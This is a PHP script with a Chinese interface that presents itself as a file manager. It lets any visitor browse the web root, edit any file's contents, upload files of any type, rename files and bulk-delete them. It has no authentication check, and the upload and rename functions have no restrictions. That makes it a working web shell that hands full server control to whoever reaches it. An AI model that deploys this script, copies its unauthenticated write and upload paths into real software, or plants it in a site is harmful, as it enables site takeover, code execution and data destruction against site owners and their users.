<?php
session_start();

// 获取网站根目录
$documentRoot = realpath($_SERVER['DOCUMENT_ROOT']);
$scriptDir = dirname(__FILE__); // 这个 PHP 文件所在目录
$rootDirectory = realpath($scriptDir . '/../'); // 这个 PHP 目录的上一级

// 解析当前访问的目录
$currentDirectory = isset($_GET['directory']) ? realpath($documentRoot . '/' . $_GET['directory']) : $scriptDir;

// **当点击 "Home" 时，显示网站根目录**
if (isset($_GET['directory']) && $_GET['directory'] === "") {
    $currentDirectory = $documentRoot;
}

// 确保用户访问的目录在允许的范围内
if (strpos($currentDirectory, $documentRoot) !== 0 || !is_dir($currentDirectory)) {
    $currentDirectory = $scriptDir;
}

// **文件大小转换**
function human_filesize($bytes, $decimals = 2) {
    $sz = array('B', 'KB', 'MB', 'GB', 'TB'); // 使用array()而不是[]，兼容PHP 5.2
    $factor = floor((strlen($bytes) - 1) / 3);
    return sprintf("%.{$decimals}f", $bytes / pow(1024, $factor)) . " " . (isset($sz[$factor]) ? $sz[$factor] : '');
}

// **处理文件编辑**
if (isset($_GET['edit'])) {
    $fileToEdit = realpath($documentRoot . '/' . $_GET['edit']);

    if ($fileToEdit && strpos($fileToEdit, $documentRoot) === 0 && is_file($fileToEdit)) {
        if ($_SERVER['REQUEST_METHOD'] == 'POST' && isset($_POST['fileContent'])) {
            file_put_contents($fileToEdit, $_POST['fileContent']);
            echo "<p>✅ 文件已保存</p>";
        }
        $content = htmlspecialchars(file_get_contents($fileToEdit));
        echo "<h2>编辑文件: " . basename($fileToEdit) . "</h2>";
        echo "<form method='POST'>
                <textarea name='fileContent' style='width:100%;height:300px;'>".$content."</textarea>
                <button type='submit'>保存</button>
                <a href='?directory=" . urlencode(str_replace($documentRoot, "", $currentDirectory)) . "'>返回</a>
              </form>";
        exit;
    } else {
        echo "<p>❌ 无法编辑文件，路径无效或文件不存在</p>";
        exit;
    }
}

// **文件上传**
if ($_SERVER['REQUEST_METHOD'] == 'POST' && isset($_FILES['uploadFile'])) {
    $uploadFile = $currentDirectory . '/' . basename($_FILES['uploadFile']['name']);
    if (move_uploaded_file($_FILES['uploadFile']['tmp_name'], $uploadFile)) {
        echo "<p>✅ 文件上传成功</p>";
    } else {
        echo "<p>❌ 文件上传失败</p>";
    }
}

// **处理批量删除文件**
if ($_SERVER['REQUEST_METHOD'] == 'POST' && isset($_POST['deleteFiles'])) {
    $filesToDelete = json_decode($_POST['deleteFiles'], true);
    $deleted = array(); // 使用array()而不是[]，兼容PHP 5.2
    $errors = array(); // 使用array()而不是[]，兼容PHP 5.2

    foreach ($filesToDelete as $fileName) {
        $fileToDelete = realpath($currentDirectory . '/' . $fileName);
        if ($fileToDelete && strpos($fileToDelete, $documentRoot) === 0 && is_file($fileToDelete)) {
            if (unlink($fileToDelete)) {
                $deleted[] = $fileName;
            } else {
                $errors[] = $fileName;
            }
        } else {
            $errors[] = $fileName;
        }
    }

    echo json_encode(array("deleted" => $deleted, "errors" => $errors)); // 使用array()而不是[]，兼容PHP 5.2
    exit;
}

// **处理文件重命名**
if (isset($_POST['rename'])) {
    $oldName = realpath($currentDirectory . '/' . $_POST['fileName']);
    $newName = $currentDirectory . '/' . $_POST['copyName'];
    if ($oldName && strpos($oldName, $documentRoot) === 0) {
        if (rename($oldName, $newName)) {
            echo json_encode(array("status" => "success", "message" => "文件已重命名")); // 使用array()而不是[]，兼容PHP 5.2
        } else {
            echo json_encode(array("status" => "error", "message" => "重命名失败：权限不足")); // 使用array()而不是[]，兼容PHP 5.2
        }
    } else {
        echo json_encode(array("status" => "error", "message" => "重命名失败：文件不存在")); // 使用array()而不是[]，兼容PHP 5.2
    }
    exit;
}

// **获取当前目录下的文件和文件夹**
$fileList = is_dir($currentDirectory) ? scandir($currentDirectory) : array(); // 使用array()而不是[]，兼容PHP 5.2

// **面包屑导航**
$breadcrumbs = array(); // 使用array()而不是[]，兼容PHP 5.2
$pathParts = explode("/", trim(str_replace($documentRoot, "", $currentDirectory), "/"));
$pathLink = "";
$breadcrumbs[] = "<a href='?directory='>Home</a>";

foreach ($pathParts as $part) {
    if (!empty($part)) { // 避免空路径部分
        $pathLink .= "/" . $part;
        $breadcrumbs[] = "<a href='?directory=" . urlencode($pathLink) . "'>" . htmlspecialchars($part) . "</a>";
    }
}
?>
<!DOCTYPE html>
<html>
<head>
    <meta charset="UTF-8">
    <title>文件管理器</title>
    <style>
        body { font-family: Arial, sans-serif; }
        table { border-collapse: collapse; width: 100%; }
        th, td { padding: 8px; text-align: left; }
        th { background-color: #f2f2f2; }
        tr:nth-child(even) { background-color: #f9f9f9; }
        .breadcrumbs { margin: 10px 0; }
        button { margin: 2px; }
    </style>
</head>
<body>
<?php
echo "<div class='breadcrumbs'>" . implode(" &gt; ", $breadcrumbs) . "</div>";

// 添加文件上传表单
echo '<form method="POST" enctype="multipart/form-data" style="margin: 10px 0;">
        <input type="file" name="uploadFile" required>
        <button type="submit">📤 上传文件</button>
      </form>';

echo "<form id='deleteForm'>";
echo "<button type='button' onclick='toggleSelectAll()'>全选/取消全选</button>";
echo "<button type='button' onclick='deleteSelectedFiles()'>❌ 批量删除</button>";
echo "<table border='1' cellspacing='0' cellpadding='5'>";
echo "<tr><th>选择</th><th>文件名</th><th>文件大小</th><th>最后修改时间</th><th>操作</th></tr>";

foreach ($fileList as $file) {
    if ($file == "." || $file == "..") continue;
    $filePath = $currentDirectory . '/' . $file;
    
    $fileSize = is_dir($filePath) ? '-' : human_filesize(filesize($filePath));
    $fileDate = date("Y-m-d H:i:s", filemtime($filePath));
    $fileNameHtml = htmlspecialchars($file); // 安全输出文件名

    echo "<tr>";
    echo "<td><input type='checkbox' class='file-checkbox' value='" . $fileNameHtml . "'></td>";
    if (is_dir($filePath)) {
        echo "<td>[📁] <a href='?directory=" . urlencode(str_replace($documentRoot . '/', '', $filePath)) . "'>".$fileNameHtml."</a></td>";
        echo "<td>-</td><td>".$fileDate."</td>";
    } else {
        echo "<td>[📄] ".$fileNameHtml."</td>";
        echo "<td>".$fileSize."</td><td>".$fileDate."</td>";
    }
    echo "<td>
            <button type='button' onclick='editFile(\"" . htmlspecialchars(str_replace($documentRoot . '/', '', $filePath)) . "\")'>📝 编辑</button>
            <button type='button' onclick='renameFile(\"".addslashes($fileNameHtml)."\")'>✏️ 重命名</button>
          </td>";
    echo "</tr>";
}
echo "</table>";
echo "</form>";
?>

<script>
function editFile(fileName) {
    window.location.href = '?edit=' + encodeURIComponent(fileName);
}

function renameFile(fileName) {
    var newName = prompt('请输入新的文件名:', fileName);
    if (newName) {
        var xhr = new XMLHttpRequest();
        xhr.open('POST', window.location.href, true);
        xhr.setRequestHeader('Content-Type', 'application/x-www-form-urlencoded');
        xhr.onreadystatechange = function() {
            if (xhr.readyState === 4 && xhr.status === 200) {
                try {
                    var data = JSON.parse(xhr.responseText);
                    alert(data.message);
                    location.reload();
                } catch(e) {
                    alert('操作失败：' + xhr.responseText);
                }
            }
        };
        xhr.send('rename=1&fileName=' + encodeURIComponent(fileName) + '&copyName=' + encodeURIComponent(newName));
    }
}

function toggleSelectAll() {
    var checkboxes = document.querySelectorAll('.file-checkbox');
    var allChecked = true;
    for (var i = 0; i < checkboxes.length; i++) {
        if (!checkboxes[i].checked) {
            allChecked = false;
            break;
        }
    }
    for (var i = 0; i < checkboxes.length; i++) {
        checkboxes[i].checked = !allChecked;
    }
}

function deleteSelectedFiles() {
    var checkboxes = document.querySelectorAll('.file-checkbox:checked');
    var selectedFiles = [];
    for (var i = 0; i < checkboxes.length; i++) {
        selectedFiles.push(checkboxes[i].value);
    }
    if (selectedFiles.length > 0 && confirm('确定要删除选中的文件吗？')) {
        var xhr = new XMLHttpRequest();
        xhr.open('POST', window.location.href, true);
        xhr.setRequestHeader('Content-Type', 'application/x-www-form-urlencoded');
        xhr.onreadystatechange = function() {
            if (xhr.readyState === 4 && xhr.status === 200) {
                try {
                    var data = JSON.parse(xhr.responseText);
                    if (data.deleted && data.deleted.length > 0) {
                        alert('删除成功: ' + data.deleted.join(', '));
                    }
                    if (data.errors && data.errors.length > 0) {
                        alert('删除失败: ' + data.errors.join(', '));
                    }
                    location.reload();
                } catch(e) {
                    alert('操作失败：' + xhr.responseText);
                }
            }
        };
        xhr.send('deleteFiles=' + encodeURIComponent(JSON.stringify(selectedFiles)));
    }
}
</script>
</body>
</html>
